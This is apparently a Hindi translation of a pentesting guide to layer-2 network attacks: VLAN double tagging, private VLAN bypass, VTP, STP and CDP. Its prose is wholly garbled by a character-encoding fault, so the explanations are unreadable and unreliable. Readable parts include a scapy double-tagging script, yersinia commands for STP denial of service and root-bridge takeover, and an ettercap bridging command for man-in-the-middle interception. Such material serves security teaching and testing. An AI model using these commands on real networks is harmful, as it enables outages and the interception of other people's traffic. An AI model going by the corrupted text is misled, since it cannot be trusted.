**рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдирд╛ рдФрд░ рдЕрдиреНрдп VLAN рдореЗрдВ рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдЦреЛрдЬ** рдХреА рдЪрд░реНрдЪрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣рдорд▓рд╛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ** рдЙрдкрдХрд░рдг рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### рдбрдмрд▓ рдЯреИрдЧрд┐рдВрдЧ

рдпрджрд┐ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреАрдбрд╝рд┐рдд рд╣реЛрд╕реНрдЯ рдХреЗ **MAC, IP рдФрд░ VLAN ID** рдХреА рдорд╛рдиреНрдпрддрд╛ рдкрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдПрдХ рдлреНрд░реЗрдо рдХреЛ рдЕрдкрдиреЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд VLAN рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЗ VLAN рдХреЗ рд╕рд╛рде **рдбрдмрд▓ рдЯреИрдЧ рдХрд░рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ **рдкреАрдбрд╝рд┐рдд рдЖрдХреНрд░рдордгрдХрд░реНрддрд╛ рд╕реЗ рд╡рд╛рдкрд╕ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдЧрд╛**, рдЗрд╕рд▓рд┐рдП **рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡реЛрддреНрддрдо рд╡рд┐рдХрд▓реНрдк рд╣реИ UDP** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрдЪрд╛рд░ рдХрд░рдирд╛ рдЬреЛ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ SNMP)ред

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реИ рдХрд┐ рд╡рд╣ **рдПрдХ TCP рдкреЛрд░реНрдЯ рд╕реНрдХреИрди рд▓реЙрдиреНрдЪ рдХрд░реЗ рдЬреЛ рдПрдХ рдЖрдХреНрд░рдордгрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдПрд╡рдВ рдкреАрдбрд╝рд┐рдд рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп IP рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рд╡рд╛рд▓рд╛ рд╣реЛ** (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ)ред рдлрд┐рд░, рд╣рдорд▓рд╛рд╡рд░ рджреВрд╕рд░реЗ рд╣реЛрд╕реНрдЯ рдореЗрдВ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рд╡рд╣ рдкреАрдбрд╝рд┐рдд рд╕реЗ рдХреБрдЫ рдкреИрдХреЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (635) (1).png>)

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк scapy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `pip install scapy`

```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```

#### рд▓реЗрдЯрд░рд▓ VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдмрд╛рдпрдкрд╛рд╕ <a href="#d679" id="d679"></a>

рдпрджрд┐ рдЖрдкрдХреЗ **рдбрд╛рдпрд░реЗрдХреНрдЯрд▓реА рдХрдиреЗрдХреНрдЯреЗрдб рд╕реНрд╡рд┐рдЪ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕** рд╣реИ, рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ **VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реИред рдмрд╕ **рдкреЛрд░реНрдЯ рдХреЛ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░реЗрдВ** (рдЬрд┐рд╕реЗ рдЯреНрд░рдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ), рд▓рдХреНрд╖рд┐рдд VLANs рдХреЗ рдЖрдИрдбреА рдХреЗ рд╕рд╛рде рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдПрдВ, рдФрд░ рдПрдХ рдЖрдИрдкреА рдкрддрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВред рдЖрдк рдЖрдИрдкреА рдкрддрд╛ рдХрд╛ рдЕрдиреБрд░реЛрдз рдбрд╛рдпрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдбреАрдПрдЪрд╕реАрдкреА) рдпрд╛ рдЖрдк рдЗрд╕реЗ рд╕реНрдерд┐рд░ рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдорд╛рдорд▓реЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### рд▓реЗрдпрд░ 3 рдкреНрд░рд╛рдЗрд╡реЗрдЯ VLAN рдмрд╛рдпрдкрд╛рд╕

рдХреБрдЫ рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ, рдЬреИрд╕реЗ рдореЗрд╣рдорд╛рди рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ, **рдкреЛрд░реНрдЯ рдЖрдЗрд╕реЛрд▓реЗрд╢рди (рдЬрд┐рд╕реЗ рдкреНрд░рд╛рдЗрд╡реЗрдЯ VLAN рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ)** рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рдЕрдорд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╛рдпрд░рд▓реЗрд╕ рдПрдХреНрд╕реЗрд╕ рдкреНрд╡рд╛рдЗрдВрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯреЗрдб рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рд╕реАрдзреЗ рдПрдХ-рджреВрд╕рд░реЗ рд╕реЗ рд╕рдВрдЪрд╛рд░ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рддрдХрдиреАрдХ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдЧрдИ рд╣реИ рдЬреЛ рдЗрди рдЖрдЗрд╕реЛрд▓реЗрд╢рди рдЙрдкрд╛рдпреЛрдВ рдХреЛ рджреМрд░ рдХрд░ рд╕рдХрддреА рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рдиреЗрдЯрд╡рд░реНрдХ ACLs рдХреА рдХрдореА рдпрд╛ рдЙрдирдХреЗ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рд╢рд┐рдХрд╛рд░ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЖрдИрдкреА рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рд░рд╛рдЙрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдЕрдиреНрдп рдХреНрд▓рд╛рдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╣рдорд▓рд╛ рдЗрд╕рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдПрдХ **рдкреИрдХреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЧрдВрддрд╡реНрдп рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рдЖрдИрдкреА рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд░рд╛рдЙрдЯрд░ рдХрд╛ рдореИрдХ рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ**ред рдЗрд╕рд╕реЗ рд░рд╛рдЙрдЯрд░ рдЧрд▓рддреА рд╕реЗ рдкреИрдХреЗрдЯ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ рддрдХ рдлреЙрд░рд╡рд░реНрдб рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЙрдкрд╛рдп рдбрдмрд▓ рдЯреИрдЧрд┐рдВрдЧ рд╣рдорд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрд╕реА рдХреЗ рд╕рдорд╛рди рд╣реИ, рдЬрд╣рд╛рдВ рдкреАрдбрд╝рд┐рдд рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реЛрд╕реНрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд╛ рд╢рд┐рдХрд╛рд░ рд╣реЛрддрд╛ рд╣реИред

**рд╣рдорд▓реЗ рдХреА рдореБрдЦреНрдп рдХрджрдо:**

1. **рдкреИрдХреЗрдЯ рддреИрдпрд╛рд░ рдХрд░рдирд╛:** рдПрдХ рдкреИрдХреЗрдЯ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд▓рдХреНрд╖рд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рдЖрдИрдкреА рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд░рд╛рдЙрдЯрд░ рдХрд╛ рдореИрдХ рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИред
2. **рд░рд╛рдЙрдЯрд░ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛:** рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреИрдХреЗрдЯ рд░рд╛рдЙрдЯрд░ рддрдХ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рдХрд╛рд░рдг, рдкреНрд░рд╛рдЗрд╡реЗрдЯ VLAN рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдЖрдЗрд╕реЛрд▓реЗрд╢рди рдХреЛ рджреМрд░ рдХрд░рддреЗ рд╣реБрдП рдкреИрдХреЗрдЯ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪрд╛рддрд╛ рд╣реИред

### VTP рд╣рдорд▓реЗ

VTP (VLAN Trunking Protocol) VLAN рдкреНрд░рдмрдВрдзрди рдХреЛ рдХреЗрдВрджреНрд░реАрдХреГрдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдЕрдЦрдВрдбрддрд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ; рдХрд┐рд╕реА рднреА рд╕рдВрд╢реЛрдзрди рд╕реЗ рдпрд╣ рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝ рдЬрд╛рддреА рд╣реИред рд╕реНрд╡рд┐рдЪ рдЙрдЪреНрдЪ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЕрдкрдирд╛рддреЗ рд╣реИрдВ, рдЕрдкрдиреА рдЦреБрдж рдХреА VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рддреЗ рд╣реИрдВред

#### VTP рдбреЛрдореЗрди рднреВрдорд┐рдХрд╛рдПрдБ

* **VTP рд╕рд░реНрд╡рд░:** VLANs рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддрд╛ рд╣реИтАФрдмрдирд╛рддрд╛ рд╣реИ, рд╣рдЯрд╛рддрд╛ рд╣реИ, рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдбреЛрдореЗрди рд╕рджрд╕реНрдпреЛрдВ рдХреЛ VTP рдШреЛрд╖рдгрд╛рдПрдБ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред
* **VTP рдХреНрд▓рд╛рдЗрдВрдЯ:** рдЕрдкрдиреА VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рд╕рдордХреНрд░рдорд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП VTP рдШреЛрд╖рдгрд╛рдПрдБ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рднреВрдорд┐рдХрд╛ рд╕реНрдерд╛рдиреАрдп VLAN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд╢реЛрдзрдиреЛрдВ рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реИред
* **VTP рдкрд╛рд░рджрд░реНрд╢реА:** VTP рдЕрдкрдбреЗрдЯ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реЛрддрд╛ рд▓реЗрдХрд┐рди VTP рдШреЛрд╖рдгрд╛рдПрдБ рдлреЙрд░рд╡рд░реНрдб рдХрд░рддрд╛ рд╣реИред VTP рд╣рдорд▓реЛрдВ рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдирд╣реАрдВ рд╣реЛрддрд╛, рдпрд╣ рд╢реВрдиреНрдп рдХреА рдПрдХ рд╕реНрдерд┐рд░ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рдмрдирд╛рдП рд░рдЦрддрд╛ рд╣реИред

#### VTP рд╡рд┐рдЬреНрдЮрд╛рдкрди рдкреНрд░рдХрд╛рд░

* **рд╕рд╛рд░рд╛рдВрд╢ рд╡рд┐рдЬреНрдЮрд╛рдкрди:** VTP рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╣рд░ 300 рд╕реЗрдХрдВрдб рдореЗрдВ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдорд╣рддреНрд╡рдкреВрд░реНрдг рдбреЛрдореЗрди рд╕реВрдЪрдирд╛ рд▓реЗрдХрд░ред
* **рд╕рдмрд╕реЗрдЯ рд╡рд┐рдЬреНрдЮрд╛рдкрди:** VLAN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЗ рдмрд╛рдж рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рд╡рд┐рдЬреНрдЮрд╛рдкрди рдЕрдиреБрд░реЛрдз:** рдПрдХ VTP рдХреНрд▓рд╛рдЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ рдПрдХ рд╕рд╛рд░рд╛рдВрд╢ рд╡рд┐рдЬреНрдЮрд╛рдкрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рд╛рдорд╛рдиреНрдпрдд: рдПрдХ рдЙрдЪреНрдЪ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рдЙрддреНрддрд░ рдореЗрдВред

VTP рдХрдордЬреЛрд░рд┐рдпрд╛рдВ рдХреЗрд╡рд▓ рдЯреНрд░рдВрдХ рдкреЛрд░реНрдЯреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ VTP рдШреЛрд╖рдгрд╛рдПрдБ рдХреЗрд╡рд▓ рдЙрдирдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╕рд╛рд░рд┐рдд рд╣реЛрддреА рд╣реИрдВред DTP рд╣рдорд▓реЗ рдХреЗ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рдмрд╛рдж VTP рдХреА рдУрд░ рдореЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред рдпрд░реНрд╕рд┐рдирд┐рдпрд╛ рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг VTP рд╣рдорд▓реЛрдВ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рд╡реАрдПрд▓рдПрди рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдорд┐рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рд╡рд┐рдШрдЯрд┐рдд рдХрд░рддреЗ рд╣реИрдВред

рдзреНрдпрд╛рди рджреЗрдВ: рдпрд╣ рдЪрд░реНрдЪрд╛ VTP рд╕рдВрд╕реНрдХрд░рдг 1 (VTPv1) рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред

````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````

### STP рд╣рдорд▓реЗ

**рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рдЗрдВрдЯрд░рдлреЗрд╕ рдкрд░ BPDU рдлреНрд░реЗрдо рдХреИрдкреНрдЪрд░ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ STP рд╣рдорд▓реЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрдирд╛ рдЕрд╕рдВрднрд╡ рд╣реИред**

#### **STP BPDU рдбреАрдУрдПрд╕**

рдмрд╣реБрдд рд╕рд╛рд░реЗ BPDUs TCP (рдЯреЛрдкреЛрд▓реЙрдЬреА рдЪреЗрдВрдЬ рдиреЛрдЯрд┐рдлрд┐рдХреЗрд╢рди) рдпрд╛ Conf (рдЬрдм рдЯреЛрдкреЛрд▓реЙрдЬреА рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ рддреЛ рднреЗрдЬреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ BPDUs) рднреЗрдЬрдХрд░ рд╕реНрд╡рд┐рдЪ рдХреЛ рдУрд╡рд░рд▓реЛрдб рдХрд░ рджреЗрддреЗ рд╣реИрдВ рдФрд░ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдирд╛ рдмрдВрдж рдХрд░ рджреЗрддреЗ рд╣реИрдВред

```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```

#### **STP TCP рд╣рдорд▓рд╛**

рдЬрдм рдПрдХ TCP рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕реНрд╡рд┐рдЪреЛрдВ рдХреА CAM рддрд╛рд▓рд┐рдХрд╛ 15 рд╕реЗрдХрдВрдб рдореЗрдВ рд╣рдЯрд╛ рджреА рдЬрд╛рдПрдЧреАред рдлрд┐рд░, рдпрджрд┐ рдЖрдк рд▓рдЧрд╛рддрд╛рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯ рднреЗрдЬ рд░рд╣реЗ рд╣реИрдВ, рддреЛ CAM рддрд╛рд▓рд┐рдХрд╛ рд▓рдЧрд╛рддрд╛рд░ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рд╣реЛ рдЬрд╛рдПрдЧреА (рдпрд╛ рд╣рд░ 15 рд╕реЗрдХрдВрдб рдореЗрдВ) рдФрд░ рдЬрдм рдпрд╣ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рд╣реЛрддреА рд╣реИ, рд╕реНрд╡рд┐рдЪ рд╣рдм рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред

```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```

#### **STP рд░реВрдЯ рд╣рдорд▓рд╛**

рд╣рдорд▓рд╛рд╡рд╛рджреА рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ STP рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рд┐рдЪ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддрд╛ рд╣реИред рдлрд┐рд░, рдЕрдзрд┐рдХ рдбреЗрдЯрд╛ рдЙрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЧреБрдЬрд░реЗрдЧрд╛ред рдпрд╣ рджреЛ рд╡рд┐рднрд┐рдиреНрди рд╕реНрд╡рд┐рдЪреЛрдВ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд┐рдП рдЬрд╛рдиреЗ рдкрд░ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрддрд╛ рд╣реИред\
рдЗрд╕реЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд░реВрдЯ рд╕реНрд╡рд┐рдЪ рдХреА рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рд╕реЗ рдХрдо рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдорд╛рди рдХрд░ BPDUs CONF рдкреИрдХреЗрдЯ рднреЗрдЬрдХрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```

**рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд╛рд░ 2 рд╕реНрд╡рд┐рдЪ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реИрдВ рддреЛ рд╡рд╣ рдирдП рдкреЗрдбрд╝ рдХреА рдЬрдбрд╝ рдмрди рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рджреЛрдиреЛрдВ рд╕реНрд╡рд┐рдЪ рдХреЗ рдмреАрдЪ рдХрд╛ рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдЙрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрдЧрд╛** (рдПрдХ MITM рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред

```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```

### CDP рд╣рдорд▓реЗ

CISCO рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (CDP) CISCO рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдЬреЛ рдЙрдиреНрд╣реЗрдВ **рдкрд╣рдЪрд╛рдирдиреЗ рдФрд░ рд╡рд┐рдиреНрдпрд╛рд╕ рд╡рд┐рд╡рд░рдг рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

#### рдкреИрд╕рд┐рд╡ рдбреЗрдЯрд╛ рд╕рдВрдЧреНрд░рд╣рдг <a href="#id-0e0f" id="id-0e0f"></a>

CDP рдХреЛ рд╕рднреА рдкреЛрд░реНрдЯреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░, рд╕реНрд╡рд┐рдЪ рдкреЛрд░реНрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдкрд░, **Wireshark**, **tcpdump**, рдпрд╛ **Yersinia** рдЬреИрд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдирд┐рдлрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдЙрдкрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЗрд╕рдХрд╛ рдореЙрдбрд▓ рдФрд░ Cisco IOS рдХрд╛ рд╕рдВрд╕реНрдХрд░рдг рд╢рд╛рдорд┐рд▓ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ рдкрд╣рдЪрд╛рдиреЗ рдЧрдП Cisco IOS рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рд╡рд┐рд╢реЗрд╖ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

